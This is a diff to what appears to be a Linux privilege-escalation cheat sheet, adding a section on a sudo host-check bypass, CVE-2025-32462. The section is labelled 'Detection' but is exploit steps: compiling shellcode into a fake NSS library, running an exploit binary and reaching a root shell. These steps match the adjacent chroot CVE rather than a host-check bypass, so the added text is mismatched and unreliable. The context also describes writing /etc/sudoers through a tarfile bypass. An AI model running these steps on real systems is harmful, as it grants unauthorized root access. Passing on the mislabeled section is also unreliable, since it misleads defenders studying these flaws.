@@ -759,6 +759,26 @@ uid=0(root) gid=0(root) groups=0(root)
 
 **Reference:** https://github.com/pr0v3rbs/CVE-2025-32463_chwoot
 
+### CVE-2025-32462 - Sudo Host-Check Bypass
+
+Sudo `1.8.8` through versions before `1.9.17p1` can be a candidate for the sudoers host-check bypass when host-specific sudoers rules are involved.
+
+Detection:
+
+```bash
+sudo -V
+# Sudo version 1.8.31
+
+tar xvf sudo-1.8.31.tar
+make
+mkdir libnss_x
+cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c
+cc -O3 -o exploit exploit.c
+./exploit
+id
+# uid=0(root) gid=0(root) groups=0(root),8(mail),997(filter),1000(brian.moore)
+```
+
 ### CVE-2025-4517 - Python tarfile extract filter bypass (symlink/hardlink)
 
 Python 3.8.0–3.13.1: `tarfile.extractall(path=..., filter="data")` (and `extract(..., filter="data")`) can be bypassed when entries use symlinks whose resolved path length exceeds `PATH_MAX`; later symlinks are not fully expanded, allowing path traversal. Combined with hardlinks, an attacker can write arbitrary files (e.g. `/etc/sudoers`, `/root/.ssh/authorized_keys`) during extraction.
